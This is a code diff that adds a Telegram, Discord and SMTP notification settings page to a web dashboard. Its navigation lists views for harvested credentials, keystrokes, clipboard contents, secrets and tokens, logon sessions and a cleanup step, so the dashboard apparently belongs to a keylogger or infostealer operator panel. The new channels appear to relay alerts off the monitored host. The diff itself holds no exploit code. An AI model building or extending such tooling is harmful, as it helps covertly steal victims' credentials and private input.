@@ -270,6 +270,17 @@
     padding:10px 14px;border-radius:9px;font-size:12.5px;box-shadow:var(--shadow);max-width:340px}
   .toast.bad{border-left-color:var(--bad)}
 
+  .fld{display:grid;gap:5px;margin-bottom:12px;font-size:11.5px;color:var(--mut);letter-spacing:.3px}
+  .fld span{font-weight:600;text-transform:uppercase;font-size:10px;letter-spacing:.6px}
+  .fld input{width:100%}
+  .notify-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(380px,1fr));gap:16px}
+  .notify-head{display:flex;align-items:flex-start;gap:10px;margin-bottom:14px}
+  .notify-head h3{margin:0;flex:1}
+  .switch{display:inline-flex;align-items:center;gap:9px;cursor:pointer;font-size:12px;color:var(--mut);user-select:none}
+  .switch input{accent-color:var(--acc);width:16px;height:16px;cursor:pointer}
+  .msg-ok{color:var(--ok)} .msg-bad{color:var(--bad)}
+  .note code{background:var(--card2);border:1px solid var(--line);border-radius:6px;padding:1px 6px;font-size:11.5px}
+
   @media (max-width:1400px){ .kpis{grid-template-columns:repeat(3,minmax(0,1fr))} }
   @media (max-width:1100px){
     .app{grid-template-columns:1fr}
@@ -306,6 +317,7 @@
       <a href="#live" data-v="live"><span class="ic">◉</span> Live feed<span class="tail" id="nav-live">0</span></a>
       <a href="#events" data-v="events"><span class="ic">≡</span> Events<span class="tail" id="nav-events">0</span></a>
       <a href="#control" data-v="control"><span class="ic">⏻</span> Control</a>
+      <a href="#notify" data-v="notify"><span class="ic">🔔</span> Notifications</a>
       <div class="grp">Host telemetry</div>
       <a href="#creds" data-v="creds"><span class="ic">🔑</span> Credentials</a>
       <a href="#sessions" data-v="sessions"><span class="ic">👤</span> Logon sessions</a>
@@ -624,6 +636,105 @@
         </div>
       </section>
 
+      <!-- ================= NOTIFICATIONS ================= -->
+      <section class="view" data-view="notify">
+        <div class="card">
+          <h3>Notification channels
+            <span class="mut">Telegram · Discord · Email — saved live, no restart needed</span>
+            <span class="right"><span class="badge b-info" id="notify-armed">0 armed</span></span>
+          </h3>
+          <div class="note" style="margin-bottom:14px">
+            Changes take effect immediately and are written to <code>config.json</code> (never committed).
+            Secrets are shown masked — leave them alone to keep the saved value.
+            <b>Blank a field</b> to clear it. The <b>Test</b> button forces a real send.
+          </div>
+
+          <div class="notify-grid">
+
+            <!-- Telegram -->
+            <div class="card" data-channel="telegram" style="background:var(--card2)">
+              <div class="notify-head">
+                <h3>✈️ Telegram</h3>
+                <span class="badge b-info" id="tg-state">off</span>
+                <label class="switch"><input type="checkbox" id="tg-enabled"> enabled</label>
+              </div>
+              <label class="fld"><span>Bot token</span>
+                <input type="password" id="tg-token" autocomplete="off" spellcheck="false"
+                       placeholder="123456789:AAH..."></label>
+              <label class="fld"><span>Chat ID</span>
+                <input type="text" id="tg-chat" inputmode="numeric" spellcheck="false"
+                       placeholder="-1004314752915 (groups are negative)"></label>
+              <div class="actions">
+                <button class="btn primary" data-save="telegram">💾 Save</button>
+                <button class="btn" data-test="telegram">🔔 Send test</button>
+                <span class="mut" id="tg-msg"></span>
+              </div>
+              <div class="map-note" style="margin-top:10px">
+                Setup: @BotFather → <code>/newbot</code> → add the bot →
+                open <code>https://api.telegram.org/bot&#60;TOKEN&#62;/getUpdates</code> after messaging it → copy <code>chat.id</code>.
+              </div>
+            </div>
+
+            <!-- Discord -->
+            <div class="card" data-channel="discord" style="background:var(--card2)">
+              <div class="notify-head">
+                <h3>💬 Discord</h3>
+                <span class="badge b-info" id="dc-state">off</span>
+                <label class="switch"><input type="checkbox" id="dc-enabled"> enabled</label>
+              </div>
+              <label class="fld"><span>Webhook URL</span>
+                <input type="password" id="dc-url" autocomplete="off" spellcheck="false"
+                       placeholder="https://discord.com/api/webhooks/..."></label>
+              <div class="actions">
+                <button class="btn primary" data-save="discord">💾 Save</button>
+                <button class="btn" data-test="discord">🔔 Send test</button>
+                <span class="mut" id="dc-msg"></span>
+              </div>
+              <div class="map-note" style="margin-top:10px">
+                Server Settings → Integrations → Webhooks → New Webhook → Copy URL. No bot app needed,
+                it is a plain HTTPS POST.
+              </div>
+            </div>
+
+            <!-- Email -->
+            <div class="card" data-channel="email" style="background:var(--card2)">
+              <div class="notify-head">
+                <h3>✉️ Email (SMTP)</h3>
+                <span class="badge b-info" id="em-state">off</span>
+                <label class="switch"><input type="checkbox" id="em-enabled"> enabled</label>
+              </div>
+              <div style="display:grid;grid-template-columns:1.2fr .6fr;gap:10px">
+                <label class="fld"><span>SMTP host</span>
+                  <input type="text" id="em-host" spellcheck="false" placeholder="smtp.gmail.com"></label>
+                <label class="fld"><span>Port</span>
+                  <input type="number" id="em-port" min="1" max="65535" placeholder="587"></label>
+              </div>
+              <label class="fld"><span>Username</span>
+                <input type="text" id="em-user" autocomplete="off" spellcheck="false"
+                       placeholder="you@gmail.com"></label>
+              <label class="fld"><span>Password <span class="mut">(app password)</span></span>
+                <input type="password" id="em-pass" autocomplete="new-password" spellcheck="false"></label>
+              <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
+                <label class="fld"><span>From</span>
+                  <input type="email" id="em-from" placeholder="you@gmail.com"></label>
+                <label class="fld"><span>To</span>
+                  <input type="email" id="em-to" placeholder="you@gmail.com"></label>
+              </div>
+              <div class="actions">
+                <button class="btn primary" data-save="email">💾 Save</button>
+                <button class="btn" data-test="email">🔔 Send test</button>
+                <span class="mut" id="em-msg"></span>
+              </div>
+              <div class="map-note" style="margin-top:10px">
+                STARTTLS on port 587 (or 465). Gmail: enable 2FA → Security → App passwords.
+                Your account password does not work.
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </section>
+
       <!-- ================= CLEANUP ================= -->
       <section class="view" data-view="cleanup">
         <div class="card">
@@ -755,7 +866,7 @@ const MODE_COLOR = { running:"var(--ok)", paused:"var(--warn)", stopped:"var(--b
 
 /* ---------------- routing ---------------- */
 const TITLES = {
-  overview:"Overview", live:"Live feed", events:"Events", control:"Control",
+  overview:"Overview", live:"Live feed", events:"Events", control:"Control", notify:"Notifications",
   creds:"Credentials", sessions:"Logon sessions", keys:"Keystrokes", files:"Files",
   secrets:"Secrets & tokens", procs:"Processes", usb:"Drives / USB", net:"Network",
   clip:"Clipboard", cleanup:"Cleanup", about:"About",
@@ -775,6 +886,7 @@ function go(view, push) {
   if (push !== false) history.replaceState(null, "", "#" + view);
   $("#sidebar").classList.remove("open");
   if (view === "overview") setTimeout(() => { if (map) map.invalidateSize(); }, 60);
+  if (view === "notify") loadNotify();
   if (LOADERS[view]) LOADERS[view]();
   if (view === "control") paintControl();
 }
@@ -1470,11 +1582,114 @@ document.addEventListener("keydown", (e) => {
   else if (e.key === "r") refreshOverview();
   else if (e.key === "t") $("#theme").click();
   else if (/^[1-9]$/.test(e.key)) {
-    const order = ["overview","live","events","control","creds","sessions","keys","files","secrets"];
+    const order = ["overview","live","events","control","notify","creds","sessions","keys","files"];
     const v = order[Number(e.key) - 1];
     if (v) go(v);
   }
 });
+
+/* ---------------- notifications view ---------------- */
+const notifyFields = {
+  telegram: [
+    { id: "tg-enabled", key: "enabled", kind: "bool" },
+    { id: "tg-token",   key: "bot_token", kind: "str" },
+    { id: "tg-chat",    key: "chat_id",   kind: "str" },
+  ],
+  discord: [
+    { id: "dc-enabled", key: "enabled",    kind: "bool" },
+    { id: "dc-url",     key: "webhook_url", kind: "str" },
+  ],
+  email: [
+    { id: "em-enabled", key: "enabled",   kind: "bool" },
+    { id: "em-host",    key: "smtp_host", kind: "str" },
+    { id: "em-port",    key: "smtp_port", kind: "int" },
+    { id: "em-user",    key: "username",  kind: "str" },
+    { id: "em-pass",    key: "password",  kind: "str" },
+    { id: "em-from",    key: "from_addr", kind: "str" },
+    { id: "em-to",      key: "to_addr",   kind: "str" },
+  ],
+};
+const notifyState = { telegram: null, discord: null, email: null };
+
+function paintNotifyBadge(ch) {
+  const s = notifyState[ch];
+  const stateEl = document.getElementById({ telegram: "tg-state", discord: "dc-state", email: "em-state" }[ch]);
+  if (!stateEl || !s) return;
+  const armed = s.enabled && s.configured;
+  stateEl.textContent = armed ? "armed" : (s.enabled ? "incomplete" : "off");
+  stateEl.className = "badge " + (armed ? "b-low" : (s.enabled ? "b-high" : "b-info"));
+  const armedEl = document.getElementById("notify-armed");
+  const n = ["telegram", "discord", "email"].filter(k => notifyState[k] && notifyState[k].enabled && notifyState[k].configured).length;
+  armedEl.textContent = n + " armed";
+}
+
+function renderNotify(ch, state) {
+  notifyState[ch] = state;
+  notifyFields[ch].forEach(({ id, key, kind }) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    if (kind === "bool") { el.checked = !!state.enabled; return; }
+    el.value = state[key] ?? "";
+  });
+  paintNotifyBadge(ch);
+}
+
+async function loadNotify() {
+  try {
+    const d = await api("/api/notify");
+    renderNotify("telegram", d.telegram || {});
+    renderNotify("discord", d.discord || {});
+    renderNotify("email", d.email || {});
+  } catch (e) {
+    toast("notifications: " + e.message, true);
+  }
+}
+
+function collectNotify(ch) {
+  const out = { channel: ch };
+  notifyFields[ch].forEach(({ id, key, kind }) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    if (kind === "bool") out[key] = el.checked;
+    else if (kind === "int") out[key] = Number(el.value) || 587;
+    else out[key] = el.value;
+  });
+  return out;
+}
+
+async function saveNotify(ch) {
+  const msg = document.getElementById({ telegram: "tg-msg", discord: "dc-msg", email: "em-msg" }[ch]);
+  msg.textContent = "saving…"; msg.className = "mut";
+  try {
+    const r = await post("/api/notify", collectNotify(ch));
+    renderNotify(ch, r.state || {});
+    msg.textContent = "saved ✓"; msg.className = "mut msg-ok";
+    toast(ch + " saved");
+  } catch (e) {
+    msg.textContent = "save failed"; msg.className = "mut msg-bad";
+    toast("save failed: " + e.message, true);
+  }
+}
+
+async function testNotify(ch) {
+  const msg = document.getElementById({ telegram: "tg-msg", discord: "dc-msg", email: "em-msg" }[ch]);
+  msg.textContent = "sending test…"; msg.className = "mut";
+  try {
+    await post("/api/notify/test", { channel: ch });
+    msg.textContent = "test sent ✓"; msg.className = "mut msg-ok";
+    toast("test sent via " + ch);
+  } catch (e) {
+    msg.textContent = "test failed"; msg.className = "mut msg-bad";
+    toast("test failed: " + e.message, true);
+  }
+}
+
+$$("[data-save]").forEach(b => b.addEventListener("click", () => saveNotify(b.dataset.save)));
+$$("[data-test]").forEach(b => b.addEventListener("click", () => testNotify(b.dataset.test)));
+$$(".notify-grid .switch input").forEach(cb => cb.addEventListener("change", () => {
+  const card = cb.closest("[data-channel]");
+  if (card) saveNotify(card.dataset.channel);
+}));
 
 /* ---------------- boot ---------------- */
 const startView = (location.hash || "#overview").slice(1);
